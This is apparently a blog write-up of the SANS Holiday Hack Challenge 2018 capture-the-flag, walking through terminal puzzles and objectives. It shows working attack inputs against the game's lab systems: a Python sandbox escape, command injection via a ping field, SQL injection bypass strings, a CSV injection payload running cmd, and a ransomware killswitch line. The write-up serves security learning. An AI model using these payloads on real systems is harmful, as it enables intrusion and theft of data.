---
title: "SANS Holiday Challenge 2018 - Writeup"
date: "2019-01-17"
slug: "sans-holiday-challenge-2018-writeup"
Categories:
- CTF
- SANS Holiday Hack
---

## Intro

Hello and Happy New Year! This year's Holiday Hack Challenge theme was an online conference called KringleCon, a cyber security conference hosted by Santa and his elves. It had all the elements of an in-person conference, including talks, badges, swag and the ability to network with other attendees. The challenge was to solve all 10 objectives and each of the "Cranberry Pi" mini-challenges.

<!--more-->

<p align="center"> 
<img src="/images/sans_2018/kringlecon.png"/>
</p>

Before reading my write-up, it is worth noting that previous Holiday Hack Challenges are kept all year now. So before you read this post, go try it out if you have not already. 


One of the best parts of Holiday Hack is the collaboration and friends you make along the way. While in *LineCON* waiting for KringleCon to open, I hung with my buddies [Cakez](https://twitter.com/_zakec) and [Taffy](https://twitter.com/RichRoc17):

<img src="/images/sans_2018/friends.png"/>

After entering Santa's castle, I noticed a suspicious character with a walkie talkie in the middle of the first room. The name above his head read "Hans," and I immediately recognized the **Die Hard** reference and knew we were in for some major fun! 

<p align="center"> 
<img src="/images/sans_2018/suspicious-activity.png"/>
</p>

## Cranberry Pi Terminals

### Essential Editor Skills

<img src="/images/sans_2018/vi-exit.png"/>

Vi can be exited a number of ways. I chose to use <code>:q!</code>. After exiting the editor, we were presented with the congratulatory message indicating we solved the first terminal.


### DevOps Fail

<img src="/images/sans_2018/devops-fail.png"/>

As shown in the screenshot above, there are some credentials stored in this repo. I parsed through the logs with *git log*:

```
commit 60a2ffea7520ee980a5fc60177ff4d0633f2516b
Author: Sparkle Redberry <sredberry@kringlecon.com>
Date:   Thu Nov 8 21:11:03 2018 -0500
    Per @tcoalbox admonishment, removed username/password from config.js, default settings i
n config.js.def need to be updated before use
```

The commit mentions removal of a username/password from config.js. Using *git diff*, we can view the modification:

```
elf@1e525d72b259:~/kcconfmgmt/.git$ git diff 60a2ffea b2376f4a
diff --git a/server/config/config.js b/server/config/config.js
new file mode 100644
index 0000000..25be269
--- /dev/null
+++ b/server/config/config.js
@@ -0,0 +1,4 @@
+// Database URL
+module.exports = {
+    'url' : 'mongodb://sredberry:twinkletwinkletwinkle@127.0.0.1:27017/node-api'

+};
diff --git a/server/config/config.js.def b/server/config/config.js.def
deleted file mode 100644
index 740eba5..0000000
--- a/server/config/config.js.def
+++ /dev/null
@@ -1,4 +0,0 @@
-// Database URL
-module.exports = {
-    'url' : 'mongodb://username:password@127.0.0.1:27017/node-api'
-};
```

As you can see in the output above, the password that was removed from the git repo belongs to Sparkle Redberry. The password and the answer for this terminal is **twinkletwinkletwinkle**.

### Python Escape From LA

<img src="/images/sans_2018/python-escape.png"/>

Interestingly, we were dropped in a Python shell. Using some of [Mark Baggett's](https://twitter.com/MarkBaggett) tricks helped us escape the restriction:

```
>>> foo = eval('__imp' + 'ort__("pt" + "y")')
>>> foo.spawn("/bin/bash")
elf@fc7481ed5f69:~$ ls   
i_escaped
elf@fc7481ed5f69:~$ ./i_escaped 
Loading, please wait......


 
  ____        _   _                      
 |  _ \ _   _| |_| |__   ___  _ __       
 | |_) | | | | __| '_ \ / _ \| '_ \      
 |  __/| |_| | |_| | | | (_) | | | |     
 |_|___ \__, |\__|_| |_|\___/|_| |_| _ _ 
 | ____||___/___ __ _ _ __   ___  __| | |
 |  _| / __|/ __/ _` | '_ \ / _ \/ _` | |
 | |___\__ \ (_| (_| | |_) |  __/ (_| |_|
 |_____|___/\___\__,_| .__/ \___|\__,_(_)
                     |_|                             


That's some fancy Python hacking -
You have sent that lizard packing!

-SugarPlum Mary
            
You escaped! Congratulations!
```


### The Name Game

<img src="/images/sans_2018/name-game.png"/>

A quick demo of the menus revealed that option 2 "verify the system" simply runs *ping*. If that is running a system command, can we inject an additional command?

```
Validating data store for employee onboard information.
Enter address of server: 8.8.8.8; ls -al
connect: Network is unreachable
total 5476
drwxr-xr-x 1 elf  elf     4096 Jan 14 06:29 .
drwxr-xr-x 1 root root    4096 Dec 14 16:17 ..
-rw-r--r-- 1 elf  elf      220 Aug 31  2015 .bash_logout
-rw-r--r-- 1 root root      95 Dec 14 16:13 .bashrc
drwxr-xr-x 3 elf  elf     4096 Jan 14 06:29 .cache
drwxr-xr-x 3 elf  elf     4096 Jan 14 06:29 .local
-rw-r--r-- 1 root root    3866 Dec 14 16:13 menu.ps1
-rw-rw-rw- 1 root root   24576 Dec 14 16:13 onboard.db
-rw-r--r-- 1 elf  elf      655 May 16  2017 .profile
-rwxr-xr-x 1 root root 5547968 Dec 14 16:13 runtoanswer
onboard.db: SQLite 3.x database
```

It worked and it shows the database file in the current directory. I injected another command to dump the DB:

```
Validating data store for employee onboard information.
Enter address of server: 8.8.8.8; sqlite3 onboard.db .dump
connect: Network is unreachable
PRAGMA foreign_keys=OFF;
BEGIN TRANSACTION;
CREATE TABLE onboard (
    id INTEGER PRIMARY KEY,
    fname TEXT NOT NULL,
    lname TEXT NOT NULL,
    street1 TEXT,
    street2 TEXT,
    city TEXT,
    postalcode TEXT,
    phone TEXT,
    email TEXT
);
==========SNIPPED=========
INSERT INTO "onboard" VALUES(80,'Danny','Williams','4736 47th Avenue',NULL,'Boyle','T0A 0M0','780-689-7571','dannynwilliams@rhyta.com');
INSERT INTO "onboard" VALUES(81,'Juan','Bowen','1968 Danforth Avenue',NULL,'Toronto','M4K 1A6','416-476-9751','juanabowen@teleworm.us');
INSERT INTO "onboard" VALUES(82,'Jim','Hill','3518 Main St',NULL,'Wolfville','B0P 1X0','902-697-6163','jimchill@teleworm.us');
INSERT INTO "onboard" VALUES(83,'Joseph','Johnson','3443 Delaware Avenue',NULL,'San Francisco','94108','415-274-4354','josephjjohnson@cuvox.de');
INSERT INTO "onboard" VALUES(84,'Scott','Chan','48 Colorado Way',NULL,'Los Angeles','90067','4017533509','scottmchan90067@gmail.com');
COMMIT;
onboard.db: SQLite 3.x database
==========SNIPPED=========
```

As shown in the output above, the first name of our guy "Chan!" is Scott...

<img src="/images/sans_2018/hello-scott.png"/>

### The Sleighbell

<img src="/images/sans_2018/sleighbell.png"/>

As shown in the screenshot above, the goal of this challenge is to win the sleighbell lottery. I used <code>objdump -d sleighbell-lotto</code> to disassemble the binary and spotted a function called *winnerwinner*. I loaded the binary into *gdb*, set a breakpoint in main, and called the discovered function:

```
elf@e7e28b7283f9:~$ ls
gdb  objdump  sleighbell-lotto
elf@e7e28b7283f9:~$ gdb ./sleighbell-lotto 
(gdb) break main
Breakpoint 1 at 0x5555555554ce
(gdb) run
Starting program: /home/elf/sleighbell-lotto 
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Breakpoint 1, 0x00005555555554ce in main ()
(gdb) jump winnerwinner
Continuing at 0x555555554fdb.
                                                                                
                                                     .....          ......      
                                     ..,;:::::cccodkkkkkkkkkxdc;.   .......     
                             .';:codkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkx.........    
                         ':okkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkx..........   
                     .;okkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkdc..........   
                  .:xkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkko;.     ........   
                'lkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkx:.          ......    
              ;xkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkd'                       
            .xkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkx'                         
           .kkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkx'                           
           xkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkx;                             
          :olodxkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkk;                               
       ..........;;;;coxkkkkkkkkkkkkkkkkkkkkkkc                                 
     ...................,',,:lxkkkkkkkkkkkkkd.                                  
     ..........................';;:coxkkkkk:                                    
        ...............................ckd.                                     
          ...............................                                       
                ...........................                                     
                   .......................                                      
                              ....... ...                                       
With gdb you fixed the race.
The other elves we did out-pace.
  And now they'll see.
  They'll all watch me.
I'll hang the bells on Santa's sleigh!

Congratulations! You've won, and have successfully completed this challenge.
```

### CURLing Master

<img src="/images/sans_2018/curling-master.png"/>

A quick perusal of the users .bash_history file listed a *cURL* command. I re-ran it:

```
elf@503ec8ecc91c:~$ curl --http2-prior-knowledge http://localhost:8080/index.php
<html>
 <head>
  <title>Candy Striper Turner-On'er</title>
 </head>
 <body>
 <p>To turn the machine on, simply POST to this URL with parameter "status=on"
 
 </body>
</html>
```

The instructions presented are pretty simple. I modified my *cURL* command to send the appropriate data:

```
elf@503ec8ecc91c:~$ curl -X POST -d status=on --http2-prior-knowledge http://localhost:8080/
index.php
<html>
 <head>
  <title>Candy Striper Turner-On'er</title>
 </head>
 <body>
 <p>To turn the machine on, simply POST to this URL with parameter "status=on"
                                                                                
                                                                okkd,          
                                                               OXXXXX,         
                                                              oXXXXXXo         
                                                             ;XXXXXXX;         
                                                            ;KXXXXXXx          
                                                           oXXXXXXXO           
                                                        .lKXXXXXXX0.           
  ''''''       .''''''       .''''''       .:::;   ':okKXXXXXXXX0Oxcooddool,   
 'MMMMMO',,,,,;WMMMMM0',,,,,;WMMMMMK',,,,,,occccoOXXXXXXXXXXXXXxxXXXXXXXXXXX.  
 'MMMMN;,,,,,'0MMMMMW;,,,,,'OMMMMMW:,,,,,'kxcccc0XXXXXXXXXXXXXXxx0KKKKK000d;   
 'MMMMl,,,,,,oMMMMMMo,,,,,,lMMMMMMd,,,,,,cMxcccc0XXXXXXXXXXXXXXOdkO000KKKKK0x. 
 'MMMO',,,,,;WMMMMMO',,,,,,NMMMMMK',,,,,,XMxcccc0XXXXXXXXXXXXXXxxXXXXXXXXXXXX: 
 'MMN,,,,,,'OMMMMMW;,,,,,'kMMMMMW;,,,,,'xMMxcccc0XXXXXXXXXXXXKkkxxO00000OOx;.  
 'MMl,,,,,,lMMMMMMo,,,,,,cMMMMMMd,,,,,,:MMMxcccc0XXXXXXXXXXKOOkd0XXXXXXXXXXO.  
 'M0',,,,,;WMMMMM0',,,,,,NMMMMMK,,,,,,,XMMMxcccckXXXXXXXXXX0KXKxOKKKXXXXXXXk.  
 .c.......'cccccc.......'cccccc.......'cccc:ccc: .c0XXXXXXXXXX0xO0000000Oc     
                                                    ;xKXXXXXXX0xKXXXXXXXXK.    
                                                       ..,:ccllc:cccccc:'      
                                                                               
Unencrypted 2.0? He's such a silly guy.
That's the kind of stunt that makes my OWASP friends all cry.
Truth be told: most major sites are speaking 2.0;
TLS connections are in place when they do so.
-Holly Evergreen
<p>Congratulations! You've won and have successfully completed this challenge.
<p>POSTing data in HTTP/2.0.
 </body>
</html>  
```


### Yule Log Analysis

<img src="/images/sans_2018/yule-log.png"/>

For this challenge, we are provided with Windows evtx logs, but the creators were nice enough to give us a linux box and a python script to dump the evtx logs to a text file: 

```
elf@2005c032725e:~$ ls
evtx_dump.py  ho-ho-no.evtx  runtoanswer
elf@2005c032725e:~$ python evtx_dump.py ho-ho-no.evtx > out.txt
```

As I performed a few searches to understand the data, I could see <code>172.31.254.101</code> failing for a lot of different users. I wrote a simple one-liner that would summarize the event IDs from that IP:

```
elf@0bd5ebc989bf:~$ grep -B 35 '<Data Name="IpAddress">172.31.254.101</Data>' out.txt | grep '<EventID Qualifiers="">
4624</EventID>' | wc -l
2
elf@0bd5ebc989bf:~$ grep -B 35 '<Data Name="IpAddress">172.31.254.101</Data>' out.txt | grep '<EventID Qualifiers="">4625</EventID>' | wc -l
211
```

For the unfamiliar, the event ID 4625 is a failed login and 4624 is a successful login. The data showed that the attacker failed 211 logins and successfully logged in twice. I checked what that the username data looked like:

```
elf@be089c31f517:~$ grep -B 35 '<Data Name="IpAddress">172.31.254.101</Data>' out.txt | egrep '<Data Name="TargetUserName">' | sort | uniq -c | sort
      1 <Data Name="TargetUserName">aaron.smith</Data>
————————————————— SNIPPED —————————————————————      
      1 <Data Name="TargetUserName">vijay.kumar</Data>
      1 <Data Name="TargetUserName">vinod.kumar</Data>
      1 <Data Name="TargetUserName">wunorse.openslae</Data>
      2 <Data Name="TargetUserName">minty.candycane</Data>

```

I knew that only a single account was compromised and password spraying was the vector. The output shows that **minty.candycane** is the account that was broken into due to it being an outlier with two successful logins, while every other account had one failed login.


### Lethal ForensicELFication

<img src="/images/sans_2018/forensic-elf.png"/>

The first item of note for this challenge is a hidden directory named .secrets. It contained a directory called "her" that contained a poem.txt. However, the poem did not reveal who it was about. There is a *.viminfo* file in the home directory. This file is used to store state information so you can continue where you left off when you exited vim.

```
$ cat .viminfo 
# This viminfo file was generated by Vim 8.0.
# You may edit it if you're careful!

# Command Line History (newest to oldest):
:wq
|2,0,1536607231,,"wq"
:%s/Elinore/NEVERMORE/g
|2,0,1536607217,,"%s/Elinore/NEVERMORE/g"
```

The *.viminfo* file contained the command line history. This history reveals that Morcel Nougat performed a global search and replace in vim to replace all instances of Elinore with NEVERMORE. Submitting Elinore to runtoanswer results in:

<img src="/images/sans_2018/elinore.png"/>


### Stall Mucking Report

<img src="/images/sans_2018/stall-mucking.png"/>

The screen resolution for this made it a bit difficult. I sent the results of *ps a* to a file and viewed the contents:

```
elf@0cecab02e316:~$ ps a > out.txt
elf@0cecab02e316:~$ cat out.txt 
  PID TTY      STAT   TIME COMMAND
    1 pts/0    Ss     0:00 /bin/bash /sbin/init
   10 pts/0    S      0:00 sudo -u manager /home/manager/samba-wrapper.sh --verbosity=none --no-check-certificate --extraneous-command-argument --do-not-run-as-tyler --accept-sage-advice -a 42 -d~ --ignore-sw-holiday-special --suppress --suppress //localhost/report-upload/ directreindeerflatterystable -U report-upload
   11 pts/0    S      0:00 sudo -E -u manager /usr/bin/python /home/manager/report-check.py
   15 pts/0    S      0:00 sudo -u elf /bin/bash
   16 pts/0    S      0:00 /usr/bin/python /home/manager/report-check.py
   17 pts/0    S      0:00 /bin/bash
   20 pts/0    S      0:00 /bin/bash /home/manager/samba-wrapper.sh --verbosity=none --no-check-certificate --extraneous-command-argument --do-not-run-as-tyler --accept-sage-advice -a 42 -d~ --ignore-sw-holiday-special --suppress --suppress //localhost/report-upload/ directreindeerflatterystable -U report-upload
   22 pts/0    S      0:00 sleep 60
   31 pts/0    R+     0:00 ps a
```
The output shows the password in cleartext: **directreindeerflatterystable**. I used *smbclient* to upload the report:

```
elf@0cecab02e316:~$ smbclient //localhost/report-upload -c 'put report.txt report.txt' -U report-upload
WARNING: The "syslog" option is deprecated
Enter report-upload's password: 
Domain=[WORKGROUP] OS=[Windows 6.1] Server=[Samba 4.5.12-Debian]
putting file report.txt as \report.txt (500.9 kb/s) (average 501.0 kb/s)
elf@0cecab02e316:~$ 
                                                                               
                               .;;;;;;;;;;;;;;;'                               
                             ,NWOkkkkkkkkkkkkkkNN;                             
                           ..KM; Stall Mucking ,MN..                           
                         OMNXNMd.             .oMWXXM0.                        
                        ;MO   l0NNNNNNNNNNNNNNN0o   xMc                        
                        :MO                         xMl             '.         
                        :MO   dOOOOOOOOOOOOOOOOOd.  xMl             :l:.       
 .cc::::::::;;;;;;;;;;;,oMO  .0NNNNNNNNNNNNNNNNN0.  xMd,,,,,,,,,,,,,clll:.     
 'kkkkxxxxxddddddoooooooxMO   ..'''''''''''.        xMkcccccccllllllllllooc.   
 'kkkkxxxxxddddddoooooooxMO  .MMMMMMMMMMMMMM,       xMkcccccccllllllllllooool  
 'kkkkxxxxxddddddoooooooxMO   '::::::::::::,        xMkcccccccllllllllllool,   
 .ooooollllllccccccccc::dMO                         xMx;;;;;::::::::lllll'     
                        :MO  .ONNNNNNNNXk           xMl             :lc'       
                        :MO   dOOOOOOOOOo           xMl             ;.         
                        :MO   'cccccccccccccc:'     xMl                        
                        :MO  .WMMMMMMMMMMMMMMMW.    xMl                        
                        :MO    ...............      xMl                        
                        .NWxddddddddddddddddddddddddNW'                        
                          ;ccccccccccccccccccccccccc;                          
                                                                               

You have found the credentials I just had forgot,
And in doing so you've saved me trouble untold.
Going forward we'll leave behind policies old,
Building separate accounts for each elf in the lot.
-Wunorse Openslae
```

## Objectives

### Objective 1: Orientation Challenge

**What phrase is revealed when you answer all of the questions at the KringleCon Holiday Hack History kiosk inside the castle?**

<img src="/images/sans_2018/kringlecon-kiosk.png"/>

The image above shows me standing next to the kiosk. It poses six questions about past Holiday Hack challenges. The answers were:

1. In 2015, the Dosis siblings asked for help understanding what piece of their "Gnome in Your Home" toy?

    **Firmware** 

2. In 2015, the Dosis siblings disassembled the conspiracy dreamt up by which corporation?

    **ATNAS**

3. In 2016, participants were sent off on a problem-solving quest based on what artifact that Santa left?

    **Business card**

4. In 2016, Linux terminals at the North Pole could be accessed with what kind of computer?

    **Cranberry Pi**

5. In 2017, the North Pole was being bombarded by giant objects. What were they?

    **Snowballs**

6. In 2017, Sam the snowman needed help reassembling pages torn from what?

    **The Great Book**


After answering all these, the secret phrase was revealed:

<img src="/images/sans_2018/happy-trails.png"/>


### Objective 2: Directory Browsing

**Who submitted (First Last) the rejected talk titled Data Loss for Rainbow Teams: A Path in the Darkness? Please analyze the CFP site (https://cfp.kringlecastle.com/) to find out.**

I browsed to the CFP site to take a look:

<img src="/images/sans_2018/cfp-apply.png"/>

When I clicked APPLY NOW! link, it brought me to this URL: 

<img src="/images/sans_2018/cfp-url.png"/>

I noted the *cfp* directory and removed *cfp.html* from the URL:

<img src="/images/sans_2018/cfp-dir-listing.png"/>

Nice, a directory listing! The listing contained a document called *rejected-talks.csv*. I clicked the link and searched the document for the title of the rejected talk:

<img src="/images/sans_2018/cfp-answer.png"/>

The rejected talk was submitted by **John McClane**.


### Objective 3: de Bruijn Sequences 

**When you break into the speaker unpreparedness room, what does Morcel Nougat say?**

The door passcode panel indicated that the code was a four-shape combination. I will be totally honest here - I was preparing to write a script when I noticed that you can submit unlimited sequences without getting kicked from the terminal window. I simply "button-mashed" a few times and got lucky.

<p align="center">
<img src="/images/sans_2018/de-bruijn.png"/>
</p>

After gaining access to the room and clicking on him, Morcel Nougat proclaims **“Welcome unprepared speaker!”**


### Objective 4: Data Repo Analysis

**Retrieve the encrypted ZIP file from the North Pole Git [repository](https://git.kringlecastle.com/Upatree/santas_castle_automation). What is the password to open this file?**

I cloned the repo and ran *git log* to look for anything interesting. I found a commit with an intriguing message:

```
commit 714ba109e573f37a6538beeeb7d11c9391e92a72
Author: Shinny Upatree <shinny.upatree@kringlecastle.com>
Date:   Tue Dec 11 07:23:36 2018 +0000

    removing accidental commit
```

Then, running a quick *git diff* between the accidental commit and the previous commit revealed this:

```
$ git diff 714ba109 5f4f6414
diff --git a/schematics/files/dot/PW/for_elf_eyes_only.md b/schematics/files/dot/PW/for_elf_eyes_only.md
new file mode 100644
index 0000000..b06a507
--- /dev/null
+++ b/schematics/files/dot/PW/for_elf_eyes_only.md
@@ -0,0 +1,15 @@
+Our Lead InfoSec Engineer Bushy Evergreen has been noticing an increase of brute force attacks in our logs. Furthermore, Albaster discovered and published a vulnerability with our password length at the last Hacker Conference.
+
+Bushy directed our elves to change the password used to lock down our sensitive files to something stronger. Good thing he caught it before those dastardly villians did!
+
+
+Hopefully this is the last time we have to change our password again until next Christmas.
+
+
+
+
+Password = 'Yippee-ki-yay'
+
+
+Change ID = '9ed54617547cfca783e0f81f8dc5c927e3d1e3'
+
```

I navigated to the schematics directory and unzipped ventilation_diagram.zip with the password **Yippee-ki-yay**. Submitting this password completed the objective and the ventilation diagrams provided the map to complete the Google Ventilation Maze.


### Objective 5: AD Privilege Discovery

**Using the data set contained in this SANS Slingshot Linux image, find a reliable path from a Kerberoastable user to the Domain Admins group. What’s the user’s logon name?**

I was very excited for this challenge, I'm a big fan of BloodHound. I was hoping for a difficult challenge like writing a custom Cypher query, but getting others familiar with BloodHound is also important!

After loading the BloodHound interface and navigating to the *Queries* section, there is a pre-built query that does exactly what we are looking for. A small tip here - since *CanRDP* is not a reliable path, I disabled it in the Edge Filtering menu (located under *Special*):

<img src="/images/sans_2018/bh-edge-filtering.png"/>

Running this pre-built query with the *CanRDP* filter unchecked resulted in only one path:

<img src="/images/sans_2018/bh-final-path.png"/>

Therefore, the only Kerberoastable user with a reliable path to DA is **LDUBEJ00320@AD.KRINGLECASTLE.COM**.


### Objective 6: Badge Manipulation

**Bypass the authentication mechanism associated with the room near Pepper Minstix. A [sample employee badge is available](https://www.holidayhackchallenge.com/2018/challenges/alabaster_badge.jpg). What is the access control number revealed by the door authentication panel?**

<p align="center"> 
<img src="/images/sans_2018/alabaster_badge.jpg"/>
</p>

I performed some quick analysis of the sample badge:

1. When scanned by the badge reader, it indicated the account is disabled
2. The QR code on the badge contained <code>oRfjg5uGHmbduj2m</code>

Next, I created a new QR code with a single quote. Submitting that to the badge reader resulted in this error:

```
EXCEPTION AT (LINE 96 "USER_INFO = QUERY("SELECT FIRST_NAME,LAST_NAME,ENABLED
FROM EMPLOYEES WHERE AUTHORIZED = 1 AND UID = '{}' LIMIT 1".FORMAT(UID))"):
(1064, U'YOU HAVE AN ERROR IN YOUR SQL SYNTAX; 
CHECK THE MANUAL THAT CORRESPONDS TO YOUR MARIADB SERVER VERSION FOR THE RIGHT 
SYNTAX TO USE NEAR '' LIMIT 1' AT LINE 1")
```

Great! A very verbose SQL error. I tried the generic auth bypass string:

<code>' OR '1' = '1</code>

However, this failed because it is returning a user account that is disabled. I modified my query string to ensure I get an enabled user:

<code>' OR enabled='1</code>

Submitting this granted us access to Santa's secret room and output the control number **19880715**.


### Objective 7: HR Incident Response

**Santa uses an Elf Resources website to look for talented information security professionals. Gain access to the [website](https://careers.kringlecastle.com/) and fetch the document C:\candidate_evaluation.docx. Which terrorist organization is secretly supported by the job applicant whose name begins with "K."**

The target website is a pretty standard careers page, with an option to upload a CSV containing your work history. The hints for this challenge indicate that the vector may be related to [CSV Injection](https://www.owasp.org/index.php/CSV_Injection).

I created a CSV file (in vim) with this content and uploaded it:

```
=cmd|'/C copy C:\candidate_evaluation.docx C:\careerportal\resources\public\foobar1.docx'!A1
  ```

This injected command copies the candidate evaluation document to a location I can access externally. After waiting a few seconds, I browsed to: 

https://careers.kringlecastle.com/public/foobar.docx

I downloaded the document and opened it. It contained this snippet:

    "Krampus’s career summary included experience hardening decade old attack vectors, 
    and lacked updated skills to meet the challenges of attacks against our beloved Holidays.

    Furthermore, there is intelligence from the North Pole this elf is linked to cyber terrorist 
    organization Fancy Beaver who openly provides technical support to the villains that 
    attacked our Holidays last year."

The answer to this objective is **Fancy Beaver**.


### Objective 8: Network Traffic Forensics

**Santa has introduced a web-based packet capture and analysis tool at https://packalyzer.kringlecastle.com to support the elves and their information security work. Using the system, access and decrypt HTTP/2 network activity. What is the name of the song described in the document sent from Holly Evergreen to Alabaster Snowball?**

This one really stumped me for awhile! When I first took a look at the Packalyzer app, I ran a capture, downloaded it, and investigated using Wireshark. Unfortunately, the traffic is encrypted, but that jogged my memory about something I had seen. After solving the Python Cranberry Pi, SugarPlum Mary shares a rumor that Packalyzer was rushed into production with development code sitting in the web root. I investigated and found a reference to *app.js* in a comment in the pages source. I loaded app.js:

<img src="/images/sans_2018/app-js.png"/>

The screenshot above shows:

1. We need that keylog file to decrypt the HTTP/2 traffic
2. The app is in dev mode
3. Environment variables are being used

I knew that I needed to leak the environment variables, but how? Further down in the code:

<img src="/images/sans_2018/app-js-2.png"/>

This showed that the application builds the directory structure using the environment variables. Now, this is where I really tripped myself up... I loaded /DEV/ saw this output:

<img src="/images/sans_2018/dev-packalyzer-env.png"/>

I thought to myself, "Well, that didn't work..." and went on testing and researching anything that could leak the environment variables. If I had run the second test, shown below, I would have realized that /DEV/ worked and I was just moving too quickly:

<img src="/images/sans_2018/ssl-packalyzer-env.png"/>

As shown in the two screenshots, I was able to obtain the environment variables values from the error messages. Then I loaded the final URL to grab the client random SSL log:

<img src="/images/sans_2018/client-random-ssl.png"/>

I saved that to a file and loaded it into Wireshark (Preferences > Protocols > SSL):

<img src="/images/sans_2018/wireshark-preferences.png"/>

Parsing the decrypted pcap, I expected to see a document sent but I was only able to collect three sets of credentials:

```
alabaster:Packer-p@re-turntable192
bushy:Floppity_Floopy-flab19283
pepper:Shiz-Bamer_wabl182
```

Looking closer, these are the three users credentials for packalyzer. I logged in with all three to search around and Alabaster had a capture saved named "super_secret_packet_capture.pcap". It is a capture containing only one stream, a single SMTP connection:

<img src="/images/sans_2018/smtp-stream.png"/>


The email contained an attachment. I grabbed the base64 encoded text, decoded it and opened the file. It is a PDF describing how to transpose piano keys.


<img src="/images/sans_2018/snowball-pdf.png"/>


I completed the objective by submitting the song - **Mary Had a Little Lamb**.


### Objective 9: Ransomware Recovery

**Alabaster Snowball is in dire need of your help. Santa's file server has been hit with malware. Help Alabaster Snowball deal with the malware on Santa's server by completing several tasks.**

**Catch the Malware: Assist Alabaster by building a Snort filter to identify the malware plaguing Santa's Castle.**

I loaded up the Snort terminal:

<img src="/images/sans_2018/snort-terminal.png"/>

The <code>more_info.txt</code> file provides us with an web interface, https://snortsensor1.kringlecastle.com/, that stores the last five minutes worth of pcaps. I grabbed a few of the pcaps and started looking at the malicious traffic:

<img src="/images/sans_2018/dns-traffic.png"/> 

Interesting. I saw a lot of DNS traffic to various domains, with a very unique hex string. I wanted to understand that string before keying on it:

```
>>> '77616E6E61636F6F6B69652E6D696E2E707331'.decode('hex')
'wannacookie.min.ps1'
```

Ok, good. Since that is a wannacookie-specific string, it is a great item to key on. I built the Snort rule below to match the malicious traffic. It is worth noting this is not a production-ready rule due to its use of PCRE without at least one content keyword. I tested the rule by adding it to <code>/etc/snort/rules/local.rules</code>:

```
elf@f770b1e2e77d:~$ vim /etc/snort/rules/local.rules 
elf@f770b1e2e77d:~$ cat !$
cat /etc/snort/rules/local.rules
# $Id: local.rules,v 1.11 2004/07/23 20:15:44 bmc Exp $
# ----------------
# LOCAL RULES
# ----------------
# This file intentionally does not come with signatures.  Put your local
# additions here.
alert udp any any -> any any (msg: "WannaCookie"; sid:66666666; rev:002; pcre:"/77616E6E61636F6F6B69652E6D696E2E707331./s";)
elf@f770b1e2e77d:~$ 
[+] Congratulation! Snort is alerting on all ransomware and only the ransomware!
```

Objective completed!


**Identify the Domain: Using the Word docm file, identify the domain name that the malware communicates with.**

Where's the fun in that? I decided to grab the malware off the wire. I grabbed a pcap from https://snortsensor1.kringlecastle.com/ and fired up *tshark*:

```
$ tshark -Y dns -r snort.log.1545891713.0441875.pcap -Y 'dns.qry.name contains "77616E6E61636F6F6B69652E6D696E2E707331"' -T fields -e dns.txt > fused.txt
$ sed '/^$/d' fused.txt | sed -n 'g;n;p' > fuse2.txt
```

I put the content from <code>fuse2.txt</code> into [CyberChef](https://gchq.github.io/CyberChef/) to decode the Hex:

<img src="/images/sans_2018/wannacookie-decode.png"/>

Finally, I opened the file in a text editor and replaced all the semi-colons with newlines to clean up the formatting. There were multiple references to <code>erohetfanu.com</code> throughout the malicious powershell script. I submitted **erohetfanu.com** to complete this objective.


**Stop the Malware: Identify a way to stop the malware in its tracks!**

Alabaster mentions "another ransomware in recent history had a killswitch domain that, when registered, would prevent any further infections." I started analyzing the malware and found this line:

```powershell
if ($null -ne ((Resolve-DnsName -Name $(H2A $(B2H $(ti_rox $(B2H $(G2B $(H2B $S1))) $(Resolve-DnsName -Server erohetfanu.com -Name 6B696C6C737769746368.erohetfanu.com -Type TXT).Strings))).ToString() -ErrorAction 0 -Server 8.8.8.8))) {return}
```

This looks promising, since <code>6B696C6C737769746368</code> hex decoded equates to "killswitch". I used PowerShell ISE to complete this task. I loaded the PowerShell code, set a breakpoint at the killswitch line. Now, the call tries to resolve the name with 8.8.8.8. I removed the call to see what domain was being queried. With ISE, it is as simple as passing this into the debugger:

```powershell
$(H2A $(B2H $(ti_rox $(B2H $(G2B $(H2B $S1))) $(Resolve-DnsName -Server erohetfanu.com -Name 6B696C6C737769746368.erohetfanu.com -Type TXT).Strings)))
```

The screenshot below shows the output:

<img src="/images/sans_2018/killswitch-print.png"/>

I went over to the HoHoHoDaddy terminal and registered the <code>yippeekiyaa.aaay</code> domain:

<img src="/images/sans_2018/killswitch-register.png"/>

Registering the domain completes this objective.


**Recover Alabaster's Password: Recover Alabaster's password as found in the the encrypted password vault.**

After completing the last objective, Alabaster provides a memory dump - his encrypted password database - and a request for help recovering his passwords. This objective was tough, but I had to cross the finish line. I had a general sense for what the PowerShell code was doing, but I went through and analyzed each part with PowerShell ISE to truly understand how it worked. I'll keep this section brief, since this post is already fairly long.

The malware generates a random symmetric key and encrypts it using a public key that is retrieved with the <code>g_o_dns</code> function. In order to decrypt, I needed three items:

1. The servers public key
2. The servers private key
3. The encrypted symmetric key

When decoding hex strings looking for the killswitch, I had discovered:

```
>>> '7365727665722E637274'.decode('hex')
'server.crt'
```

I started PowerShell ISE and set a breakpoint. I called the <code>$(g_o_dns("7365727665722E637274") )</code> from the bottom terminal and obtained **server.crt**:

```powershell
Hit Line breakpoint on 'C:\Users\IEUser\Documents\wanna.ps1:112'
[DBG]: PS C:\Users\IEUser>> $(g_o_dns("7365727665722E637274") )
MIIDXTCCAkWgAwIBAgIJAP6e19cw2sCjMA0GCSqGSIb3DQEBCwUAMEUxCzAJBgNV
BAYTAkFVMRMwEQYDVQQIDApTb21lLVN0YXRlMSEwHwYDVQQKDBhJbnRlcm5ldCBX
aWRnaXRzIFB0eSBMdGQwHhcNMTgwODAzMTUwMTA3WhcNMTkwODAzMTUwMTA3WjBF
MQswCQYDVQQGEwJBVTETMBEGA1UECAwKU29tZS1TdGF0ZTEhMB8GA1UECgwYSW50
ZXJuZXQgV2lkZ2l0cyBQdHkgTHRkMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIB
